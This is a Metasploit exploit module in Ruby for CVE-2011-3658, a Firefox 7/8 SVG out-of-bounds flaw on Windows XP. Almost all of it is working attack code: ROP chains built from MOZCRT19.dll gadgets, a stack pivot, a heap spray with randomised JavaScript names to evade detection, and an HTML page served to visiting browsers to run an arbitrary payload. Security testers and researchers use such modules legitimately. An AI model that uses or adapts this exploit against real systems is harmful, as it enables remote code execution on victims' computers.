##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Firefox 7/8 (<= 8.0.1) nsSVGValue Out-of-Bounds Access Vulnerability',
			'Description'    => %q{
				This module exploits an out-of-bounds access flaw in Firefox 7 and 8 (<= 8.0.1).
				The notification of nsSVGValue observers via nsSVGValue::NotifyObservers(x,y)
				uses a loop which can result in an out-of-bounds access to attacker-controlled memory.
				The mObserver ElementAt() function (which picks up pointers), does not validate
				if a given index is out of bound. If a custom observer of nsSVGValue is created,
				which removes elements from the original observer,
				and memory layout is manipulated properly, the ElementAt() function might pick up
				an attacker provided pointer, which can be leveraged to gain remote arbitrary
				code execution.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'regenrecht',                          #vulnerability discovery
					'Lincoln<lincoln[at]corelan.be>',      #Metasploit module
					'corelanc0d3r<peter.ve[at]corelan.be>' #Metasploit module
				],
			'References'     =>
				[
					[ 'CVE', '2011-3658' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-056/' ],
					[ 'URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=708186' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Payload'        =>
				{
					'BadChars'       => "\x00\x0a\x0d\x34",
					'DisableNops'    => true,
					'PrependEncoder' => "\x81\xc4\x24\xfa\xff\xff"
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', {} ],
					[
						'Windows XP - Firefox 7',
						{
							'Ret'    => 0x0C0C0C0C,
							'OffSet' => 0x606,
							'Size'   => 0x40000,
							'PopEax' => 0x7819e4b4, # POP EAX # RETN [MOZCRT19.dll]
							'FF'     => 7,
							'OS'     => 'XP'
						}
					],
					[
						'Windows XP - Firefox 8 (<= 8.0.1)',
						{
							'Ret'    => 0x0C0C0C0C,
							'OffSet' => 0x606,
							'Size'   => 0x40000,
							'PopEax' => 0x7819e504, # POP EAX # RETN [MOZCRT19.dll]
							'FF'     => 8,
							'OS'     => 'XP'
						}
					]
				],
			'DisclosureDate' => 'Dec 6 2011',
			'DefaultTarget'  => 0))

	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def junk(n=4)
		return rand_text_alpha_upper(n).unpack("L")[0].to_i
	end

	def nop
		return make_nops(4).unpack("L")[0].to_i
	end

	def get_rop_chain(ffversion,osversion)

		# mona.py ROP chains

		rop_chain = []

		if ffversion == 7 and osversion == "XP"

			rop_chain =
			[
				0x781a909c,     # ptr to &VirtualAlloc() [IAT MOZCRT19.dll]
				0x7813aeed,     # MOV EAX,DWORD PTR DS:[EAX] # RETN [MOZCRT19.dll]
				0x78194774,     # PUSH EAX # POP ESI # POP EDI # POP EBP # POP EBX # RETN [MOZCRT19.dll]
				0x78139801,     # RETN (ROP NOP) [MOZCRT19.dll] -> edi
				0x78195375,     # & push esp #  ret  [MOZCRT19.dll] -> ebp
				0x00000001,     # 0x00000001-> ebx
				0x7819966e,     # POP EDX # RETN [MOZCRT19.dll]
				0x00001000,     # 0x00001000-> edx
				0x7813557f,     # POP ECX # RETN [MOZCRT19.dll]
				0x00000040,     # 0x00000040-> ecx
				0x781a4da8,     # POP EAX # RETN [MOZCRT19.dll]
				nop,            # nop
				0x7813d647,     # PUSHAD # RETN [MOZCRT19.dll]
			].flatten.pack("V*")

		elsif ffversion == 8 and osversion == "XP"

			rop_chain =
			[
				0x781a909c,     # ptr to &VirtualAlloc() [IAT MOZCRT19.dll]
				0x7813af5d,     # MOV EAX,DWORD PTR DS:[EAX] # RETN [MOZCRT19.dll]
				0x78197f06,     # XCHG EAX,ESI # RETN [MOZCRT19.dll]
				0x7814eef1,     # POP EBP # RETN [MOZCRT19.dll]
				0x781503c3,     # & call esp [MOZCRT19.dll]
				0x781391d0,     # POP EBX # RETN [MOZCRT19.dll]
				0x00000001,     # 0x00000001-> ebx
				0x781a147c,     # POP EDX # RETN [MOZCRT19.dll]
				0x00001000,     # 0x00001000-> edx
				0x7819728e,     # POP ECX # RETN [MOZCRT19.dll]
				0x00000040,     # 0x00000040-> ecx
				0x781945b5,     # POP EDI # RETN [MOZCRT19.dll]
				0x78152809,     # RETN (ROP NOP) [MOZCRT19.dll]
				0x7819ce58,     # POP EAX # RETN [MOZCRT19.dll]
				nop,            # nop
				0x7813d6b7,     # PUSHAD # RETN [MOZCRT19.dll]
			].flatten.pack("V*")

		end

		return rop_chain
	end


	def on_request_uri(cli, request)
		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# determine the target FF and OS version

		ffversion = ""
		osversion = ""

		agent = request.headers['User-Agent']

		if agent !~ /Firefox\/7\.0/ and agent !~ /Firefox\/8\.0/ and agent !~ /Firefox\/8\.0\.1/
			vprint_error("This browser version is not supported: #{agent.to_s}")
			send_not_found(cli)
			return
		end

		my_target = target
		if my_target.name == 'Automatic'
			if agent =~ /NT 5\.1/ and agent =~ /Firefox\/7/
				my_target = targets[1]
			elsif agent =~ /NT 5\.1/ and agent =~ /Firefox\/8/
				my_target = targets[2]
			elsif vprint_error("This Operating System is not supported: #{agent.to_s}")
				send_not_found(cli)
				return
			end
			target = my_target
		end

		# Create the payload
		print_status("Creating payload for #{target.name}")
		table =
		[
			0x0c0c0c0c,  # index
			0x0c0c0c0c,  # index
			0x0c0c0c0c,  # index
			0x7c45abdf   # Stack->Heap Flip XCHG EAX,ESP # ADD [EAX],EAX # ADD ESP,48h # RETN 28 [MOZCPP19.DLL]
		].pack("V*")

		rop = rand_text_alpha_upper(56)
		rop << [ target['PopEax'] ].pack("V")
		rop << rand_text_alpha_upper(40)
		rop << get_rop_chain(target['FF'],target['OS'])

		# Encode table, chain and payload
		rop_js = Rex::Text.to_unescape(table+rop, Rex::Arch.endian(target.arch))

		code = payload.encoded
		code_js = Rex::Text.to_unescape(code, Rex::Arch.endian(target.arch))

		# random JavaScript variable names
		i_name                  = rand_text_alpha(rand(10) + 5)
		rop_name                = rand_text_alpha(rand(10) + 5)
		code_name               = rand_text_alpha(rand(10) + 5)
		offset_length_name      = rand_text_alpha(rand(10) + 5)
		randnum1_name           = rand_text_alpha(rand(10) + 5)
		randnum2_name           = rand_text_alpha(rand(10) + 5)
		randnum3_name           = rand_text_alpha(rand(10) + 5)
		randnum4_name           = rand_text_alpha(rand(10) + 5)
		paddingstr_name         = rand_text_alpha(rand(10) + 5)
		padding_name            = rand_text_alpha(rand(10) + 5)
		junk_offset_name        = rand_text_alpha(rand(10) + 5)
		single_sprayblock_name  = rand_text_alpha(rand(10) + 5)
		sprayblock_name         = rand_text_alpha(rand(10) + 5)
		varname_name            = rand_text_alpha(rand(10) + 5)
		thisvarname_name        = rand_text_alpha(rand(10) + 5)
		container_name          = rand_text_alpha(rand(10) + 5)
		tls_name                = rand_text_alpha(rand(10) + 5)
		tl_name                 = rand_text_alpha(rand(10) + 5)
		rect_name               = rand_text_alpha(rand(10) + 5)
		big_name                = rand_text_alpha(rand(10) + 5)
		small_name              = rand_text_alpha(rand(10) + 5)
		listener_name           = rand_text_alpha(rand(10) + 5)
		run_name                = rand_text_alpha(rand(10) + 5)
		svg_name                = rand_text_alpha(rand(10) + 5)
		atl_name                = rand_text_alpha(rand(10) + 5)
		addr_name               = rand_text_alpha(rand(10) + 5)
		trans_name              = rand_text_alpha(rand(10) + 5)
		matrix_name             = rand_text_alpha(rand(10) + 5)

		# corelan precise heap spray for Firefox >= 7
		# + trigger routine
		spray = <<-JS

		var #{rop_name} = unescape("#{rop_js}");
		var #{code_name} = unescape("#{code_js}");
		var #{offset_length_name} = #{target['OffSet']};

		for (var #{i_name}=0; #{i_name} < 0x300; #{i_name}++)
		{
			var #{randnum1_name}=Math.floor(Math.random()*90)+10;
			var #{randnum2_name}=Math.floor(Math.random()*90)+10;
			var #{randnum3_name}=Math.floor(Math.random()*90)+10;
			var #{randnum4_name}=Math.floor(Math.random()*90)+10;

			var #{paddingstr_name} = "%u" + #{randnum1_name}.toString() + #{randnum2_name}.toString();
			#{paddingstr_name} += "%u" + #{randnum3_name}.toString() + #{randnum4_name}.toString();

			var #{padding_name} = unescape(#{paddingstr_name});

			while (#{padding_name}.length < 0x1000) #{padding_name}+= #{padding_name};

			#{junk_offset_name} = #{padding_name}.substring(0, #{offset_length_name});

			var #{single_sprayblock_name} = #{junk_offset_name} + #{rop_name} + #{code_name};
			#{single_sprayblock_name} += #{padding_name}.substring(0,0x800 - #{offset_length_name} - #{rop_name}.length - #{code_name}.length);

			while (#{single_sprayblock_name}.length < #{target['Size']}) #{single_sprayblock_name} += #{single_sprayblock_name};

			#{sprayblock_name} = #{single_sprayblock_name}.substring(0, (#{target['Size']}-6)/2);

			#{varname_name} = "var" + #{randnum1_name}.toString() + #{randnum2_name}.toString();
			#{varname_name} += #{randnum3_name}.toString() + #{randnum4_name}.toString() + #{i_name}.toString();
			#{thisvarname_name} = "var " + #{varname_name} + "= '" + #{sprayblock_name} +"';";
			eval(#{thisvarname_name});
		}

		var #{container_name} = [];

		var #{tls_name} = [];
		var #{rect_name} = null;
		var #{big_name} = null;
		var #{small_name} = null;

		function #{listener_name}() {
			#{rect_name}.removeEventListener("DOMAttrModified", #{listener_name}, false);
			for each (#{tl_name} in #{tls_name})
			#{tl_name}.clear();

			for (#{i_name} = 0; #{i_name} < (1<<7); ++#{i_name})
				#{container_name}.push(unescape(#{big_name}));
			for (#{i_name} = 0; #{i_name} < (1<<22); ++#{i_name})
				#{container_name}.push(unescape(#{small_name}));
		}

		function #{run_name}() {
			var #{svg_name} = document.getElementById("#{svg_name}");
			#{rect_name} = document.getElementById("#{rect_name}");

			for (#{i_name} = 0; #{i_name} < (1<<13); ++#{i_name}) {
				#{rect_name} = #{rect_name}.cloneNode(false);
				var #{atl_name} = #{rect_name}.transform;
				var #{tl_name} = #{atl_name}.baseVal;
				#{tls_name}.push(#{tl_name});
			}

			const #{addr_name} = unescape("%u0c0c");
			#{big_name} = #{addr_name};
			while (#{big_name}.length != 0x1000)
			#{big_name} += #{big_name};

			#{small_name} = #{addr_name};
			while (#{small_name}.length != 15)
			#{small_name} += #{addr_name};

			var #{trans_name} = #{svg_name}.createSVGTransform();
			for each (#{tl_name} in #{tls_name})
				#{tl_name}.appendItem(#{trans_name});

			#{rect_name}.addEventListener("DOMAttrModified", #{listener_name}, false);
			var #{matrix_name} = #{svg_name}.createSVGMatrix();
			#{trans_name}.setMatrix(#{matrix_name});
		}
		JS

		# build html
		content = <<-HTML
		<html>
		<head>
		<meta http-equiv="refresh" content="3">
		<body>
		<script language='javascript'>
		#{spray}
		</script>
		</head>
		<body onload="#{run_name}();">
		<svg id="#{svg_name}">
		<rect id="#{rect_name}"	/>
		</svg>
		</body>
		</html>
		HTML

		print_status("Sending HTML")

		# Transmit the response to the client
		send_response(cli, content, {'Content-Type'=>'text/html'})

	end

end